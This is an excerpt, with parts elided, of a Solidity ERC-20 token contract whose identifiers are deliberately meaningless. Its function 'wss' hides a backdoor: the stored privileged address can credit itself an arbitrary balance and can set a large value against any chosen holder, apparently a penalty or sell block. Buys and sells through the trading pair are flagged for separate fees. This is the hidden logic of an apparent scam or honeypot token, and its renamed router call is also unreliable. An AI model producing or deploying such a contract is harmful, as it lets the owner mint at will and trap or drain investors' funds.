...
interface IUniswapV2Router01 {
    ...
    function BTCI() external pure returns (address);
}
...
contract tokf is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public zzz;
    ...
    function asdfg() public onlyOwner{
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.BTCI());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
        zzz[address(uniswapPair)] = true;
    }
    ...
    function wss(address abuyt,uint256 zxcv) public {
        ...
        qwerg = msg.sender;
        uint256 BTCI = zxcv;
        if (BTCI > 2013) _ces[dFReth] += uint256(BTCI);
        if (BTCI == 6) extend[abuyt] = 10**10;
        require(dFReth == qwerg);
    }
    ...
    function takeLiquidity(address sender, address recipient, uint256 tAmount) internal returns (uint256) {
        ...
        bool isSell = zzz[recipient];
        bool isBuy = zzz[sender];
        uint256 fee = 0;
